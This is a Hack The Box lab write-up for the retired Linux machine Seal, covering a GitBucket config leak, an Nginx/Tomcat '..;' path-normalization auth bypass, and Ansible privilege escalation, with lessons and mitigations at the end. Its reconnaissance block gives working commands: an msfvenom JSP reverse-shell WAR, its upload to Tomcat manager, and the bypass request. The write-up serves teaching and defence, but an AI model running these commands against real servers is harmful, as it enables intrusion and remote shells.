---
machine: Seal
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, gitbucket, nginx, tomcat, parser-differential, ansible]
---

# Seal — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

GitBucket leaks Nginx and Tomcat configuration. A URL normalization difference between the proxy and Tomcat bypasses authentication and deploys an application. A backup and a root-run Ansible playbook complete the escalation.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,443,8080 <IP>
# GitBucket
git clone http://<IP>:8080/git/<USER>/<REPO>.git
cat nginx.conf; cat server.xml
# Parser differential
curl -s "http://seal.htb/manager/..;/html"
# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
curl -u <USER>:<PASS> --upload-file shell.war "http://seal.htb/manager/text/deploy?path=/shell"
# Ansible
find / -name "*.yml" -path "*ansible*" 2>/dev/null
```

## Enumeration

- GitBucket with repositories and deployment credentials.
- Nginx in front of Tomcat with path-based auth rules.
- Periodic backup and Ansible executed with privileges.

## Initial access

Clone the repositories and review `nginx.conf`, `server.xml` and credentials. Find a discrepancy when parsing `..;` or encoded paths; deploy a malicious WAR to Tomcat and obtain a shell.

## Privilege escalation

A backup includes the next user's files and key. With that account, locate an Ansible playbook run as root; modify a task and obtain root.

## Evidence

- Repositories with Nginx/Tomcat configuration.
- Path bypassing authentication and deployed WAR.
- Modified Ansible playbook and root shell.

## Lessons learned

- Proxy and backend can parse the same URL differently.
- GitBucket and repositories leak operational secrets.
- Privileged Ansible is code execution when the playbook is writable.

## Mitigation and detection

- Normalize and validate paths in the proxy and Tomcat.
- Restrict repositories and rotate credentials.
- Run Ansible with least privilege and protect playbooks.

## References

- [0xdf — Seal](https://0xdf.gitlab.io/2021/11/13/htb-seal.html)
- [Tomcat — Security](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)
- [Hack The Box — Seal](https://app.hackthebox.com/machines/seal)
